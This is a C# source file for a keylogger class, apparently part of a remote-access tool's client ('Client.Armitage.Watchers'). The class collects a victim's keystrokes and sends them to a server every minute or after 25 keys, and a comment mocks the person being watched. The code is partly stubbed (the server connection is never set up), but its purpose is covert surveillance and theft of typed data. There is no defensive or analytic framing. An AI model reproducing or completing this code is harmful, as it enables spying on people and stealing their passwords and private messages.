using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage.Watchers
{
    /// <summary>
    /// Logs the unfortunate person's writings...<i>what have you been doing my love?</i>
    /// </summary>
    public class Keylogger
    {
        private int _maxrefreshtime = 60;

        private System.Timers.Timer _refreshtimer;
        public Keylogger()
        {
            _refreshtimer = new System.Timers.Timer();
            _refreshtimer.Interval = 60 * 1000;
            _refreshtimer.Elapsed += _refreshtimer_Elapsed;
            _refreshtimer.Start();
        }

        private void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            SendStrokes();
        }

        private Communication.String_Stacker _server;

        /// <summary>
        /// The amount of keystrokes until the logger sends the data to the server.
        /// </summary>
        public int MaxKeysPerSend = 25;

        /// <summary>
        /// Keystrokes are stored here.
        /// </summary>
        public StringBuilder RawLogged = new StringBuilder();


        public void AddStroke(string stroke)
        {
            RawLogged.Append(stroke);
            if (RawLogged.Length > MaxKeysPerSend)
            {
                SendStrokes();
                // reset the timer
                _refreshtimer.Stop();
                _refreshtimer.Start();
            }
        }
        public void SendStrokes()
        {
            if (RawLogged.Length >= 1)
            {
                _server.Send(RawLogged.ToString());
                RawLogged.Clear();
            }
        }

        public static void Start()
        {

        }

    }
}
